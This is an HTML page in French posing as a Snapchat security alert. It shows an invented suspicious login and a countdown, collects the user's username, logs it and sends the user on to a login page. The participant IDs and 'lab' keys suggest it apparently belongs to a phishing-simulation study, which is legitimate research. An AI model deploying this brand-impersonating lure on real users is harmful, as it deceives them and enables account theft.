<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/>
<title>Alerte sécurité · Snapchat</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@600;700;800&amp;family=Plus+Jakarta+Sans:wght@400;500;700&amp;display=swap" rel="stylesheet"/>
<link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:wght,FILL@100..700,0..1&amp;display=swap" rel="stylesheet"/>
<style>
    body {
        background-color: #ffb2bd;
        background-image: radial-gradient(#b80049 10%, transparent 11%), radial-gradient(#b80049 10%, transparent 11%);
        background-size: 40px 40px; background-position: 0 0, 20px 20px; background-attachment: fixed;
        margin: 0; min-height: 100vh; display: flex; align-items: center; justify-content: center;
        font-family: 'Plus Jakarta Sans', sans-serif; padding: 20px;
    }
    .neo-card {
        background: #fff; border: 4px solid #000; box-shadow: 10px 10px 0 0 #000;
        border-radius: 24px; padding: 36px 28px; max-width: 420px; width: 100%; text-align: center;
        position: relative; overflow: hidden;
    }
    .icon { font-size: 56px; margin-bottom: 12px; }
    h1 { font-family: Outfit; font-size: 26px; font-weight: 800; margin: 0 0 8px; color: #ba1a1a; }
    .alert-box {
        background: #ffebee; border: 3px solid #ba1a1a; border-radius: 14px; padding: 14px;
        margin: 16px 0; font-size: 14px; text-align: left; line-height: 1.6;
        box-shadow: 4px 4px 0 0 rgba(186,26,26,0.2);
    }
    .alert-box strong { color: #ba1a1a; }
    .input-neo {
        width: 100%; padding: 14px 16px; border: 4px solid #000; border-radius: 14px;
        font-size: 16px; outline: none; box-sizing: border-box; margin-top: 16px;
        background: #f9f9f9; font-family: 'Plus Jakarta Sans', sans-serif;
        transition: box-shadow 0.2s;
    }
    .input-neo:focus { box-shadow: 4px 4px 0 0 #000; }
    .btn-primary {
        width: 100%; padding: 16px; border: 4px solid #000; border-radius: 14px;
        font-size: 20px; font-weight: 800; cursor: pointer; margin-top: 16px;
        background: #ba1a1a; color: #fff; box-shadow: 6px 6px 0 0 #000;
        transition: all 0.1s; font-family: Outfit;
    }
    .btn-primary:active { transform: translate(4px,4px); box-shadow: 2px 2px 0 0 #000; }
    .timer-box {
        background: #f4f4f4; border: 3px solid #000; border-radius: 12px;
        padding: 8px 16px; display: inline-flex; align-items: center; gap: 8px;
        margin-top: 16px; font-size: 13px; font-weight: 700; box-shadow: 3px 3px 0 0 #000;
    }
    .timer-box .material-symbols-outlined { font-size: 18px; }
    .badge-error {
        display: inline-block; background: #ba1a1a; color: #fff; border: 2px solid #000;
        padding: 4px 14px; border-radius: 8px; font-size: 11px; font-weight: 700;
        box-shadow: 2px 2px 0 0 #000; margin-bottom: 12px;
    }
</style>
</head>
<body>
<div class="neo-card">
    <span class="badge-error">🔴 URGENT</span>
    <div class="icon">🔐</div>
    <h1>Alerte de sécurité</h1>
    <p style="font-size:14px;color:#5c3f43;margin-bottom:8px;">Une connexion suspecte a été détectée.</p>
    <div class="alert-box">
        <strong>📍 Paris, France</strong><br>
        📱 iPhone 15 Pro · Chrome Windows<br>
        🕐 Il y a <strong>3 minutes</strong><br>
        🌐 IP : 86.xxx.xxx.42
    </div>
    <p style="font-size:13px;color:#5c3f43;">Vérifiez votre compte pour sécuriser l'accès.</p>
    <input type="text" class="input-neo" id="pseudo" placeholder="Entrez votre pseudo Snapchat" autocomplete="off">
    <button class="btn-primary" id="nextBtn">🔒 Vérifier mon compte</button>
    <div class="timer-box">
        <span class="material-symbols-outlined">timer</span>
        <span>Expire dans <span id="countdown">14:59</span></span>
    </div>
</div>
<script>
var pid = '{{ participant_id }}';
sessionStorage.setItem('participant_id', pid);
var end = Date.now() + 15*60*1000;
setInterval(function(){
    var d = Math.max(0, Math.floor((end-Date.now())/1000));
    document.getElementById('countdown').innerText = String(Math.floor(d/60)).padStart(2,'0')+':'+String(d%60).padStart(2,'0');
}, 1000);
document.getElementById('nextBtn').addEventListener('click', function(){
    var p = document.getElementById('pseudo').value.trim();
    sessionStorage.setItem('lab_pseudo', p || 'inconnu');
    fetch('/api/log', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({event:'SECURITE_VIEW',participant_id:pid,pseudo:p||'inconnu'})}).catch(function(){});
    window.location.href = '/login?from=securite';
});
</script>
</body>
</html>
